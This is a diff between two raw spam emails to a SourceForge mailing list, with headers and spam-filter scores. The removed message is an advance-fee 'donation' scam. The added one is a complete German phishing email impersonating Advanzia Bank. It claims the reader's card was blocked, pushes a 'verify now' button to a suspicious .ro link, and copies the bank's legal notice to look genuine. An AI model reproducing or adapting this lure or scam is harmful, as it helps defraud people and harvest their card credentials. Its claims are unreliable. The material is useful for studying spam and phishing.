@@ -2,125 +2,85 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id A8536A7CB89
-	for <lists+osst-users@lfdr.de>; Sat,  5 Apr 2025 20:38:49 +0200 (CEST)
-Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
-	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
+	by mail.lfdr.de (Postfix) with ESMTPS id B562EA7FA27
+	for <lists+osst-users@lfdr.de>; Tue,  8 Apr 2025 11:46:34 +0200 (CEST)
+Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
+	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1u18Pp-0007Gp-3B
+	id 1u25XM-0001jb-VS
 	for lists+osst-users@lfdr.de;
-	Sat, 05 Apr 2025 18:38:48 +0000
+	Tue, 08 Apr 2025 09:46:33 +0000
 Received: from [172.30.29.66] (helo=mx.sourceforge.net)
- by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
+ by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
- (envelope-from <info@sunadhomeandmedicare.com>) id 1u18Pn-0007Gj-NS
- for osst-users@lists.sourceforge.net; Sat, 05 Apr 2025 18:38:47 +0000
+ (envelope-from <info@fritze-sh.de>) id 1u25XM-0001jC-Bj
+ for osst-users@lists.sourceforge.net; Tue, 08 Apr 2025 09:46:32 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Subject:Content-Transfer-Encoding:Content-Type:
- MIME-Version:Message-ID:Date:To:From:Reply-To:Sender:Cc:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
+ :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=HGtrhjojpB7a4BxrAQfku32yapZhHB6G9NQ9qTlqW1U=; b=BdVM544YtpPxtH0vx8Srtulxtj
- 79Y+HlURrjuyWppGq+FEHc1vs265rugy6Hp5EAtwhMgm0VTfwJDZ1zQopgXmUA91W3CKOzpJ5wEn/
- SBZd0Y8L1EdsAE8pjoseRML22ZVXLtP9Mby+LFaXpSRp1xJzh8Lpf5wufC988XpRcTqs=;
+ bh=/Dx29PdTSZupqlrWFkfsaRFj28vH1DLIIYQi0LVNh4c=; b=QMwjffIFbIR7uAWBDlLCNvOFot
+ Nl7ZOJQG9qnbrfe5I5sLVmEYbSfPNtYkxoQfelLPE7knAr6gKvu0Y9Duq4qHZIX1Kh9hc3apg1sfq
+ O0XVRYkX2DMpAASzRLLIgmhs2Ze67aJrZcu+SbzmO67lJACdM7nY3we3KoyF7Gb7PW5c=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Subject:Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:
- Date:To:From:Reply-To:Sender:Cc:Content-ID:Content-Description:Resent-Date:
- Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+ h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
+ Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
+ :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=HGtrhjojpB7a4BxrAQfku32yapZhHB6G9NQ9qTlqW1U=; b=L
- nyJCIoVU+kznyADF0/+aHcckhli849mlo/aUHT4q/2pAi8p/1EAkYH/yNBFbiiMPzMWHbYUYNoVqv
- 9C+7bIdAFKjPgQ8y1XqrKiLGilooAtlN1mgO1/5imH84ulZvvhIKhIpKE3nBAlFSg9GOG0a/x4AjM
- T2oew8Gv7LCNKxYg=;
-Received: from server.superiorinsight.net ([162.240.155.79])
- by sfi-mx-2.v28.lw.sourceforge.com with esmtps
- (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
- id 1u18PX-0006cQ-Eg for osst-users@lists.sourceforge.net;
- Sat, 05 Apr 2025 18:38:47 +0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sunadhomeandmedicare.com; s=default; h=Content-Transfer-Encoding:
- Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Reply-To:Sender:Cc:
- Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
- Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
- List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=HGtrhjojpB7a4BxrAQfku32yapZhHB6G9NQ9qTlqW1U=; b=jEabdeCkkqXdf2+0IPpGaTE1/x
- wAoqdmJxAy9DoBP/tFQPaq8c76s5CGXD6gJL/IftG1zSKZgZ1x8Rsmv6lcLnC3AL3xZPGEMtdU4lL
- pszV14v7w2Hfyu1amfGhLd9flFoWh9HRJ/EJINiSA9zvSLb9e0KoL6zcRUI9/sk0gDOKrMKtJuqY6
- 4GkTxHxdW3OyEzvRLwozNH9j4BRe2CaYrcVQ4S+VAEpxu4RM0BPIhHt/ZBtlZ1NB9mlgxau1h9thM
- HLDGgQS2pjNHPHC2u/7Yuj8tHWsM3i3BXMhfh25eHv9KboEv25UIFPk2aF2omEXWZObwvovjINW2A
- 1W5gcl0Q==;
-Received: from ec2-18-196-207-201.eu-central-1.compute.amazonaws.com
- ([18.196.207.201]:49878)
- by server.superiorinsight.net with esmtpsa (TLS1.2) tls
- TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.96.2)
- (envelope-from <info@sunadhomeandmedicare.com>) id 1tzZeK-0002oI-1g
- for osst-users@lists.sourceforge.net; Tue, 01 Apr 2025 12:19:20 +0100
-From: "St. Anthony Cathedral Charities " <info@sunadhomeandmedicare.com>
+ List-Owner:List-Archive; bh=/Dx29PdTSZupqlrWFkfsaRFj28vH1DLIIYQi0LVNh4c=; b=W
+ 4dQA+K7B1410/GQN6xA3KQOKWbDxXWyQAF+JqsphYWvEzf89rTJ3JcezAY2Ozs7FkgLp1hhBZ336C
+ b1TW31o6A6CXzcI2xb6pmgOHUcEW++qnrYisG1ZrZXUY6IlwGKy6cGTJNItFp+XaFywjgJRY0QnFO
+ Yh5N9vNJD5ofCfZo=;
+Received: from [194.36.90.194] (helo=fritze-sh.de)
+ by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
+ id 1u25X6-0004Vc-R3 for osst-users@lists.sourceforge.net;
+ Tue, 08 Apr 2025 09:46:32 +0000
+From: "Advanzia Bank" <info@fritze-sh.de>
 To: osst-users@lists.sourceforge.net
-Date: 1 Apr 2025 11:19:19 +0000
-Message-ID: <20250401111919.10A009672F0D734F@sunadhomeandmedicare.com>
+Date: 8 Apr 2025 12:46:05 +0300
+Message-ID: <20250408124605.D79DAFA7ADEDC152@fritze-sh.de>
 MIME-Version: 1.0
-X-AntiAbuse: This header was added to track abuse,
- please include it with any abuse report
-X-AntiAbuse: Primary Hostname - server.superiorinsight.net
-X-AntiAbuse: Original Domain - lists.sourceforge.net
-X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
-X-AntiAbuse: Sender Address Domain - sunadhomeandmedicare.com
-X-Get-Message-Sender-Via: server.superiorinsight.net: authenticated_id:
- info@sunadhomeandmedicare.com
-X-Authenticated-Sender: server.superiorinsight.net: info@sunadhomeandmedicare.com
-X-Source: 
-X-Source-Args: 
-X-Source-Dir: 
-X-Spam-Score: 8.6 (++++++++)
-X-Spam-Report: Spam detection software,
- running on the system "util-spamd-2.v13.lw.sourceforge.com", 
- has identified this incoming email as possible spam.  The original
+X-Spam-Score: 5.0 (+++++)
+X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
+ has NOT identified this incoming email as spam.  The original
  message has been attached to this so you can view it or label
  similar future email.  If you have any questions, see
  the administrator of that system for details.
- Content preview:  A donation of $2, 500,
- 000 from St. Anthony Cathedral Charity.
- For more details email: info@anthonycharities.org 
- Content analysis details:   (8.6 points, 6.0 required)
- pts rule name              description
+ 
+ Content preview:  Kreditkarten-Sicherheitsüberprüfung Kreditkarten-Sicherheitsüberprüfung
+    Sehr geehrter Kunde, 
+ 
+ Content analysis details:   (5.0 points, 6.0 required)
+ 
+  pts rule name              description
  ---- ---------------------- --------------------------------------------------
- 0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
- 5.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
- [162.240.155.79 listed in dnsbl-1.uceprotect.net]
- 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
- query to Validity was blocked.  See
- https://knowledge.validity.com/hc/en-us/articles/20961730681243
- for more information.
- [162.240.155.79 listed in bl.score.senderscore.com]
- 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
- query to Validity was blocked.  See
- https://knowledge.validity.com/hc/en-us/articles/20961730681243
- for more information.
- [162.240.155.79 listed in sa-accredit.habeas.com]
- 0.0 T_SPF_TEMPERROR        SPF: test of record failed (temperror)
- 0.2 FREEMAIL_REPLYTO_END_DIGIT Reply-To freemail username ends in
- digit [info.claimdpt101[at]gmail.com]
- -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
- 0.0 HTML_MESSAGE           BODY: HTML included in message
- 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
- 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
- valid
- -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
- -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
- author's domain
- -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
- envelope-from domain
- 0.0 LOTS_OF_MONEY          Huge... sums of money
- 2.5 FREEMAIL_FORGED_REPLYTO Freemail in Reply-To, but not From
- 0.6 MONEY_FREEMAIL_REPTO   Lots of money from someone using free
- email?
-X-VA-Spam-Flag: YES
-X-Spam-Flag: YES
-X-Headers-End: 1u18PX-0006cQ-Eg
-Subject: [Osst-users] [SPAM] Claim Funds!!!
+  3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
+                             [194.36.90.194 listed in zen.spamhaus.org]
+  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
+  0.0 T_TVD_FUZZY_SECTOR     BODY: No description available.
+  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                          [194.36.90.194 listed in sa-trusted.bondedsender.org]
+  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
+                             query to Validity was blocked.  See
+                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
+                              for more information.
+                             [194.36.90.194 listed in bl.score.senderscore.com]
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
+                             Colors in HTML
+  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
+  0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
+                             only
+X-Headers-End: 1u25X6-0004Vc-R3
+Subject: [Osst-users] Ihre Kreditkarte wurde vorsorglich gesperrt
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -132,32 +92,188 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: info.claimdpt101@gmail.com
-Content-Type: multipart/mixed; boundary="===============0917764473257553124=="
+Content-Type: multipart/mixed; boundary="===============1524172609918759130=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
---===============0917764473257553124==
-Content-Type: text/html
+--===============1524172609918759130==
+Content-Type: text/html;
+	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 
-<html><head><title></title>
+<html lang=3D"de"><head>
+
+  <title>Kreditkarten-Sicherheits&uuml;berpr&uuml;fung</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+    .container {
+      max-width: 520px;
+      margin: 40px auto;
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+      background-color: #05164d;
+      color: white;
+      padding: 20px;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+      font-size: 22px;
+      font-weight: bold;
+      text-align: center;
+    }
+    .content {
+      color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+      padding: 20px 0;
+    }
+    .button {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #05164d;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+    }
+    .footer {
+      font-size: 12px;
+      color: #777;
+      margin-top: 30px;
+      border-top: 1px solid #ddd;
+      padding-top: 15px;
+      text-align: center;
+    }
+  </style>
 <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
 </head>
-<body style=3D"margin: 0.4em;">A donation of&nbsp; $2,500,000 from St. Anth=
-ony&nbsp; Cathedral Charity. For more details email: <a href=3D"mailto:info=
-@anthonycharities.org">info@anthonycharities.org</a></body></html>
+<body style=3D"margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4">
+  <div style=3D"max-width: 520px;
+      margin: 40px auto;
+      background: #ffffff;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1)" class=3D"container">
+    <div style=3D"background-color: #05164d;
+      color: white;
+      padding: 20px;
+      border-top-left-radius: 12px;
+      border-top-right-radius: 12px;
+      font-size: 22px;
+      font-weight: bold;
+      text-align: center" class=3D"header">
+      Kreditkarten-Sicherheits&uuml;berpr&uuml;fung
+    </div>
+    <div style=3D"color: #333;
+      font-size: 16px;
+      line-height: 1.6;
+      padding: 20px 0" class=3D"content">
+      <p><strong>Sehr geehrter Kunde,</strong></p>
+      <p>Die Sicherheit Ihrer Kreditkartendaten liegt uns sehr am Herzen. D=
+aher setzen wir ein umfangreiches Pr&uuml;fsystem ein, um Sie vor m&ouml;gl=
+ichen Missbr&auml;uchen zu sch&uuml;tzen.</p>
+      <p>Leider haben wir bei einer Ihrer letzten Transaktionen verd&auml;c=
+htige Aktivit&auml;ten festgestellt. Zum Schutz vor weiteren Sch&auml;den w=
+urde Ihre Karte vorsorglich gesperrt.</p>
+      <p>Bitte helfen Sie uns, Ihre Karte zu reaktivieren, indem Sie auf de=
+n folgenden Button klicken:</p>
+      <a style=3D"display: inline-block;
+      margin-top: 20px;
+      padding: 12px 25px;
+      background-color: #05164d;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold" class=3D"button" href=3D"https://red1.gradinitazan=
+elor.ro/khara-berara.php">Jetzt verifizieren</a>
+    </div>
+    <div style=3D"font-size: 12px;
+      color: #777;
+      margin-top: 30px;
+      border-top: 1px solid #ddd;
+      padding-top: 15px;
+      text-align: center" class=3D"footer">
+      Bei Fragen steht Ihnen unser Kundenservice jederzeit zur Verf&uuml;gu=
+ng.<br><br>
+      Mit freundlichen Gr&uuml;&szlig;en,<br>
+      Eugen Sharkich<br>
+      Kundenservice
+    </div>
+  </div><p>
 
 
---===============0917764473257553124==
+
+
+
+<br></p><p><br></p>
+<h2 style=3D'margin: 0px 0px 1.87rem; padding: 0.87rem 4.25rem; text-align:=
+ center !important; color: rgb(26, 44, 95); text-transform: none; line-heig=
+ht: 1.4; text-indent: 0px; letter-spacing: normal; font-family: "Open Sans"=
+, sans-serif; font-size: 2.18rem; font-style: normal; font-weight: 300; wor=
+d-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; wi=
+dows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: norm=
+al; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;'>Rechtliche Hinwei=
+se</h2>
+<h3 style=3D'margin: 0px 0px 1.87rem; padding: 0px; color: rgb(26, 44, 95);=
+ text-transform: none; line-height: 1.4; text-indent: 0px; letter-spacing: =
+normal; font-family: "Open Sans", sans-serif; font-size: 1.46rem; font-styl=
+e: normal; font-weight: 300; word-spacing: 0px; white-space: normal; box-si=
+zing: border-box; orphans: 2; widows: 2; background-color: rgb(255, 255, 25=
+5); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text=
+-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial;'>A=
+dvanzia Bank S.A.</h3>
+<p style=3D'margin: 0px 0px 10px; color: rgb(0, 0, 0); text-transform: none=
+; line-height: 1.56rem; text-indent: 0px; letter-spacing: normal; font-fami=
+ly: "Open Sans", sans-serif; font-size: 16px; font-style: normal; font-weig=
+ht: 400; word-spacing: 0px; white-space: normal; box-sizing: border-box; or=
+phans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-lig=
+atures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>14, Rue Ga=
+briel Lippmann<br style=3D"box-sizing: border-box;">L-5365 Munsbach<br styl=
+e=3D"box-sizing: border-box;">Luxemburg<br style=3D"box-sizing: border-box;=
+"><br style=3D"box-sizing: border-box;">E-Mail:<span>&nbsp;</span><a style=
+=3D"color: rgb(26, 44, 95); text-decoration: none; box-sizing: border-box; =
+background-color: transparent;">info@advanzia.com</a><br style=3D"box-sizin=
+g: border-box;"><br style=3D"box-sizing: border-box;">
+<a style=3D"color: rgb(26, 44, 95); text-decoration: none; box-sizing: bord=
+er-box; background-color: transparent;" href=3D"https://www.advanzia.com/" =
+target=3D"_blank">www.advanzia.com</a><br style=3D"box-sizing: border-box;"=
+><br style=3D"box-sizing: border-box;">Handelsregister R.C. Luxemburg B1094=
+76<br style=3D"box-sizing: border-box;">Umsatzsteuernummer: LU 20992462<br =
+style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;">
+Akzeptiert als Kreditinstitut durch das Finanzministerium der Luxemburgisch=
+en Regierung unter der Nummer 47/05, der Aufsichtskommission des Finanzsekt=
+ors (CSSF) unterliegend, 283&nbsp;route d'Arlon&#8203;&#8203;&#8203;,&nbsp;=
+L-1150 Luxembourg. (<a style=3D"color: rgb(26, 44, 95); text-decoration: no=
+ne; box-sizing: border-box; background-color: transparent;" href=3D"http://=
+www.cssf.lu/" target=3D"_blank">www.cssf.lu</a>)&#8203;<br style=3D"box-siz=
+ing: border-box;"></p><p>
+<br class=3D"Apple-interchange-newline"></p></body></html>
+
+
+--===============1524172609918759130==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============0917764473257553124==
+--===============1524172609918759130==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -168,4 +284,4 @@ Osst-users mailing list
 Osst-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/osst-users
 
---===============0917764473257553124==--
+--===============1524172609918759130==--
